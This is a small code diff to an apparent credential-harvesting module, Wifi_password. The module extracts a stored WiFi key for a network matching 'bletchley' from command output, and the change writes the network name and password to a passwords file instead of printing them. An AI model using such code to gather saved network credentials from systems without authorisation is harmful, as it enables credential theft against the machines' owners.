@@ -14,4 +14,5 @@ class Wifi_password(BaseModule):
             password_line = [line.split(":")[1].strip() for line in output.split("\n") if "Key Content" in line]
             if "bletchley" in name:
                 password = password_line[0]
-                print(f"WiFi Name: {name}, Password: {password}")
+                with open("../passwords/passwords.txt", "w") as password_file:
+                    password_file.write(f"WiFi Name: {name}, Password: {password}")
